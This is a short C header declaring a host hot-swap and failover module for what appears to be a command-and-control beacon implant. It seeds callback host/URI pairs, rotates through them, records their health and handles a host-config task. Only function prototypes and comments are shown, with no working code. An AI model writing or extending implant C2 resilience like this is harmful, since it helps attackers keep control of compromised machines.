#pragma once

/* 4.10 beacon_config host hot-swap overlay (tier-3 item 10) - see
 * src/hostcfg.cpp for the official verb contract and wire format. */

/* seed the overlay from the baked "host,/uri,host,/uri" list */
void hostcfg_init(const char * domains);

/* TRUE once the overlay owns the host list the main loop picks from */
BOOL hostcfg_active(void);

/* next host for this cycle (round-robin, skipping held hosts); FALSE when
 * the overlay is empty -> caller falls back to the baked strategy path */
BOOL hostcfg_pick(char * host, int hmax, char * uri, int umax);

/* per-cycle health report; drives failover stats + notification */
void hostcfg_note(const char * host, BOOL ok);

/* COMMAND_HOST_CONFIG task handler */
void command_host_config(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
